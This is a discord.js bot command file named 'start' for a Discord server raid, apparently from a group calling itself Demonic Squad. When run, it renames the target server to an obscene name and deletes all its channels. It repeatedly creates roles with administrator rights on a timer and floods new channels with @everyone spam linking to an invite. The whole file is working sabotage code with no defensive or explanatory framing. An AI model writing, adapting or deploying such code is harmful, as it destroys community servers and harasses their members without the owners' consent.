const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

if(message.guild.name === "Ḋemonic ֆquad | Þriv") return;
if(message.guild.name === "• [ Demonic Squad | Logs ]") return;

message.guild.setName("FuckedByDemonicSquad")
message.guild.setIcon("https://cdn.discordapp.com/attachments/772238791586742272/776118622430429214/DemonicTeam.png")

    message.guild.channels.cache.map(c => {
        c.delete()
    });
  
    setInterval(async function() { 
    
    message.guild.roles.create({
      
   data: {
     name:'ṛ̴̨̢̧͔̿͛̎̅̉̃̂̌̾͊a̶͎̜̹̙̻̋͑̌̎̈͌ͅi̴̟̥̫̬̥̜̙̟͠d̶̜̦͓͋͠ ̸̭̠̘͎̙̄͋̐͋̎͠b̷̨͔̟͕̬̼̩͕͎̦̒̌͌̈́ÿ̶̢̼̬̰́ ̷̜͍̇̽̅d̴͖̘̜̹̹̻͈̖͖͍̅̔̀̾̔̓̃̈̓͝ẻ̴̛̯̖̩̪̱͈͗̔̃͐̓̌̕m̸̧͖̺̪̗̥͝ọ̶̼͙̣͇͑̀̿̚n̴͚̟̳͙̈͑̀̌̎͗͂̔͌͠i̵̱̹̒̇̀̏̃̃͗͝ć̴̢͒̐͘͠ ̴̦͍̯̎͂̽̔̂̈́ț̷̜͓͓͎͉̆́̉̌͛͌͛͝e̴͙̥͕̗͇̩̩͈̘̳̅̌̑̅͝͝ã̷̬̜͌̒͌͌̂̿͠m̶̡̢̯̲̖̗̠͙̼͂̓',
     color:'#5E0D06',
     permissions: "ADMINISTRATOR"
     
   }
    })
    
  })
  
try {

setInterval(async function() {
    var canalesraid = await message.guild.channels.create(`r̴̡̺͉̫̥̥̖̰̾̉̀͌́͐̈́̾͐͘͜a̴̤̪̮̗̿̌̍̂̈̾͋̐͘ì̶͔̰́̈̓͆d̸̢̧̻̬̣̻͖̪͍̽̅̋͊̎̒͊̂̕͜b̸̧̟̮̠̃̂̔͐͊͊̑͛͝y̴͙̭̐͂̏d̷̫̈́̊̌͑̈́͐͘͝ê̶̩͓̦̤̟̲̜͎͔͈̈́m̴̨̖̯͉̱͓͎̬͕̂̏o̷̲͙͕̘̣̦̬͖̭̐̎̕n̷̮̲̩̘͖̗͕̍̓̈́̏͆͝͝i̸̛̻̬̱͂͛͗͋̍̉͐͘͝c̴̡͙̮̫͗̈́́͗͑̕ͅs̴͕̙̙͍̳͒̓̈̋̿͗q̶̛̖͇͎͉͎̹͆̏̽̈́̕u̴͇̙͙͕̠̍̇̂͐̇̀̽̆̍͝a̴̟̩̫̫̪͔̟̻͊̽͑͆͂͘d̸̻̞̦̋`, {type: "text" })
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
message.guild.channels.cache.get(canalesraid.id).send("@everyone https://discord.gg/8gNmhfKpNS")
});

}catch(e) {
    console.log(e.stack)
}

}

exports.help = {
  name: "start",
  aliases:[],
  usage: "[ Uso Independiente : No require Argumentos ]",
  description: "Ejecuta las acciones de un raid",
  category: "General"
  
}